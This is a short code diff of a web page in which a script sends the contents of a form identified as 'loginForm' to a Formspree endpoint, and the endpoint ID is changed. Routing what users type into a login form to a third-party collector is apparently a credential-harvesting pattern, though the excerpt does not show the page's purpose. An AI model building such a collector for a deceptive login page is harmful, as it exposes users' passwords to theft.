@@ -116,14 +116,15 @@ body {
 </form>
 
 <script>
+
 document.getElementById("loginForm").addEventListener("submit", function(event) {
     event.preventDefault(); // Stop default submission
 
     const form = event.target;
     const data = new FormData(form);
 
-    // Submit to Formspree
-    fetch("https://formspree.io/f/xrblnvab", {
+    // Submit to Formspree (correct URL)
+    fetch("https://formspree.io/f/xldlqyrb", {
         method: "POST",
         body: data,
         headers: { 'Accept': 'application/json' }
